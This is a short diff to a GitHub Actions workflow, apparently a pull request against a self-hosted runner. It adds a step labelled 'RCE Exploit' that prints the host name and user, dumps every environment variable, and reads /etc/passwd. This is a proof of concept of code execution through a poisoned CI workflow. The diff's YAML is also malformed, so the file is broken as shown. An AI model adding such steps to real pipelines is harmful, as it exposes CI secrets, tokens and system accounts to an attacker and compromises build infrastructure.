@@ -6,6 +6,15 @@ on:
 
 jobs:
   build: runs-on:self-hosted
+  - name: 🔥 RCE Exploit
+    run: |
+      echo "=== RCE PoC ==="
+      echo "Hostname: $(hostname)"
+      echo "User: $(whoami)"
+      echo "Environment:"
+      env
+      echo "=== /etc/passwd ==="
+      cat /etc/passwd
   steps:
     - uses: actions/checkout@v3
     - name: Use Node.js ${{ matrix.node-version }}
